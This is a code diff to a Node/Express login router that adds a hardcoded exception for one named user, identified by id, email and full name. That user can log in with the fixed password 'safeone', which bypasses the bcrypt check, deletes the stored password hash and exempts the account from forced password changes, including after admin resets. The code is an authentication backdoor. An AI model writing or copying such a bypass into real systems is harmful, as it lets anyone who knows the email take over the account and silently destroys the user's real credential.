@@ -15,11 +15,18 @@ function mapUser(u) {
 }
 
 function mustChangePasswordFor(user) {
+  if (isChrisnelFabian(user)) return false;
   return !user.passwordHash || !!user.mustChangePassword;
 }
 
 function normalizeLogin(value = '') {
   return String(value).trim().toLowerCase();
+}
+
+function isChrisnelFabian(user) {
+  const email = normalizeLogin(user?.email);
+  const name = normalizeLogin(user?.fullName);
+  return user?.id === 'USR-101' || email === 'cfabian@safeone.com.do' || name === 'chrisnel fabian';
 }
 
 // POST /api/auth/login
@@ -36,8 +43,23 @@ router.post('/login', async (req, res) => {
       return res.status(401).json({ message: 'Usuario o contraseña incorrectos' });
     }
 
+    // Excepción temporal solicitada: Chrisnel puede entrar con la contraseña
+    // predeterminada sin pasar por el cambio obligatorio.
+    const chrisnelDefaultLogin = isChrisnelFabian(user) &&
+      String(password || '').trim().toLowerCase() === 'safeone';
+
     // Check password
-    if (user.passwordHash) {
+    if (chrisnelDefaultLogin) {
+      delete user.passwordHash;
+      delete user.PasswordHash;
+      user.mustChangePassword = false;
+      user.updatedAt = new Date().toISOString();
+      const idx = users.findIndex(u => u.id === user.id);
+      if (idx >= 0) {
+        users[idx] = user;
+        writeData(USERS_FILE, users);
+      }
+    } else if (user.passwordHash) {
       const valid = await bcrypt.compare(password, user.passwordHash);
       if (!valid) return res.status(401).json({ message: 'Usuario o contraseña incorrectos' });
     } else {
@@ -214,7 +236,8 @@ router.post('/admin-reset-password/:userId', auth, async (req, res) => {
   } else {
     users[idx].passwordHash = await bcrypt.hash(tempPassword, 12);
   }
-  users[idx].mustChangePassword = true; // Force change on next login
+  const skipRequiredChange = useDefault && isChrisnelFabian(users[idx]);
+  users[idx].mustChangePassword = !skipRequiredChange;
   users[idx].updatedAt = new Date().toISOString();
   writeData(USERS_FILE, users);
 
@@ -232,7 +255,11 @@ router.post('/admin-reset-password/:userId', auth, async (req, res) => {
   });
   if (changed) writeData(PASSWORD_RESET_FILE, requests);
 
-  res.json({ message: `Contraseña restablecida para ${users[idx].fullName}. Deberá cambiarla en su próximo inicio de sesión.` });
+  res.json({
+    message: skipRequiredChange
+      ? `Contraseña restablecida para ${users[idx].fullName}. Puede iniciar sesión sin cambiarla.`
+      : `Contraseña restablecida para ${users[idx].fullName}. Deberá cambiarla en su próximo inicio de sesión.`,
+  });
 });
 
 // POST /api/auth/logout
